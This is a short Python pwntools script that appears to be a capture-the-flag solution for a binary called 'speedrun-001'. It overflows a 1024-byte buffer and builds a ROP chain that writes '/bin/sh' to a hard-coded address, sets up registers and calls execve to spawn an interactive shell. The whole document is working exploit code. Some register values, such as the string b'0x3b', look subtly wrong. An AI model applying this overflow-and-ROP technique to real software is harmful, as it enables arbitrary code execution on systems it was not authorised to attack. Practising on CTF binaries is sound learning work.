from pwn import *
context.log_level = 'debug'

binary = './speedrun-001'
p = process(binary)
elf = context.binary = ELF(binary)
rop = ROP(binary)

overflow_offset = 1024 + 8 # gdb broken, use IDA or something
memloc = 0x00000000006b6000 # find manually
binsh = 0x0068732f6e69622f # find manually
movqword = 0x000000000048d251 # can probably automate but safer to find manually
syscall = 0x000000000040129c # this part also probably can automate

p.sendline(flat(
# placing string into memory
	"A"*overflow_offset,
	rop.ret.address,
	rop.rax.address, memloc,
	rop.rdx.address, binsh,
	movqword,
# setting other registers
	rop.rax.address, b'0x3b',
	rop.rdi.address, memloc,
	rop.rsi.address, b'\x00',
	rop.rdx.address, b'\x00',
	syscall
))
p.interactive()
